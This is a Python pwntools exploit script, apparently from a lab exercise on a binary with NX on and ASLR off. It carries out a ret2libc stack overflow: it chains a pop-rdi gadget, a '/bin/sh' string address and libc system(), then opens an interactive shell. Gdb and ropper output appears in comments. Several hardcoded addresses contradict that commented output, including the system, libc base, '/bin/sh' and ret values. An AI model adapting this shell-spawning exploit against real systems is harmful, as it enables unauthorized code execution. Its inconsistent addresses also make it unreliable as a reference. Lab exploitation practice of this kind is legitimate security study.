# sudo apt install gdb gdbserver
# pip3 install pwn

from pwn import *

################## addresses #########################

MAIN_ADDRESS = 0x5555555551e1

# gef> vmmap                                     
# 0x00007ffff7d85000 0x00007ffff7dad000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
# 0x00007ffff7dad000 0x00007ffff7f41000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
# 0x00007ffff7f41000 0x00007ffff7f99000 0x00000000001bc000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
# 0x00007ffff7f99000 0x00007ffff7f9a000 0x0000000000214000 --- /usr/lib/x86_64-linux-gnu/libc.so.6
# 0x00007ffff7f9a000 0x00007ffff7f9e000 0x0000000000214000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6

LIBC_BASE = 0x7ffff7d84000

# method 1
# gef➤ x system
# 0x7ffff7dd5ae0 <__libc_system>: 0xfa1e0ff3

# method 2
# bash> readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system                                                                      ok  04:58:32
#  1477: 0000000000050ae0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
# LIBC_BASE + 0x0000000000050ae0 = 0x7ffff7dd0ae0

SYSTEM_ADDRESS = 0x7ffff7dd4ae0

# ropper> search pop rdi
# 0x000000000002a6c5: pop rdi; ret;
POP_RDI = LIBC_BASE + 0x000000000002a6c5

# gef➤  grep /bin/sh
# [+] Searching '/bin/sh' in memory
# [+] In '/home/user/Desktop/VDSI/NX_NOASLR/vuln'(0x555555556000-0x555555557000), permission=r--
#   0x55555555603f - 0x555555556046  →   "/bin/sh"
# [+] In '/home/user/Desktop/VDSI/NX_NOASLR/vuln'(0x555555557000-0x555555558000), permission=r--
#   0x55555555703f - 0x555555557046  →   "/bin/sh"
# [+] In '[heap]'(0x555555559000-0x55555557a000), permission=rw-
#   0x5555555592ac - 0x5555555592b3  →   "/bin/sh"
# [+] In '/usr/lib/x86_64-linux-gnu/libc.so.6'(0x7ffff7f41000-0x7ffff7f99000), permission=r--
#   0x7ffff7f5ccba - 0x7ffff7f5ccc1  →   "/bin/sh"

BIN_SH = 0x40203f
# BIN_SH = 0x7ffff7f5ccba


# ropper> search ret
# 0x000000000000101a: ret;

# gef> vmmap                               
# Start              End                Offset             Perm Path
# 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/user/Desktop/VDSI/NX_NOASLR/vuln
# 0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/user/Desktop/VDSI/NX_NOASLR/vuln
# 0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/user/Desktop/VDSI/NX_NOASLR/vuln
# 0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/user/Desktop/VDSI/NX_NOASLR/vuln

RET = 0x401205


################## exploit ##########################

#context.terminal = ["tmux", "splitw", "-h"]

# p = process("./vuln")
# gdb.attach(p, '''
# b main
# ''')

p = gdb.debug('./vuln', f'''
# break at main
break *(vuln+87)

# debug automatically breaks at _start - ignore it
continue
''')

exploit = b""
exploit += p64(POP_RDI)
exploit += p64(BIN_SH)
exploit += p64(RET)
exploit += p64(SYSTEM_ADDRESS)

#p.send(b"A"*92 + b"B"*8 + b"C"*8)
p.send(b"A"*96 + b"B"*8 + exploit)

p.interactive()
